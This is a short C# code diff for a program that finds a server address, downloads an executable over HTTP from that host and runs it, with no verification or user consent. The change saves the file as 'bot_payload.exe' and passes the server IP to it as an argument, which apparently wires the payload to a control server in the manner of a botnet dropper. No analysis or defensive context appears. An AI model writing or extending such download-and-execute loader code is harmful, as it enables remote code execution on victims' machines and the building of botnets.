@@ -165,7 +165,7 @@ namespace App
         }
 
 
-        private static void DownloadAndRunFile(string download_url, string save_path)
+        private static void DownloadAndRunFile(string download_url, string save_path, string serverIp)
         {
             Logger.Log($"Attempting download: {download_url} -> {save_path}");
 
@@ -210,7 +210,7 @@ namespace App
                 try
                 {
                     Logger.Log("Starting downloaded file...");
-                    Process.Start(new ProcessStartInfo { FileName = save_path, UseShellExecute = true });
+                    Process.Start(new ProcessStartInfo { FileName = save_path, Arguments = serverIp, UseShellExecute = true });
                 }
                 catch (Exception startEx)
                 {
@@ -294,8 +294,8 @@ namespace App
             if (!string.IsNullOrEmpty(foundServerIp))
             {
                 string downloadUrl = $"http://{foundServerIp}:{TargetPort}/test.exe";
-                string savePath = Path.Combine(AppContext.BaseDirectory, "test.exe");
-                DownloadAndRunFile(downloadUrl, savePath);
+                string savePath = Path.Combine(AppContext.BaseDirectory, "bot_payload.exe");
+                DownloadAndRunFile(downloadUrl, savePath, foundServerIp);
             }
             else
             {
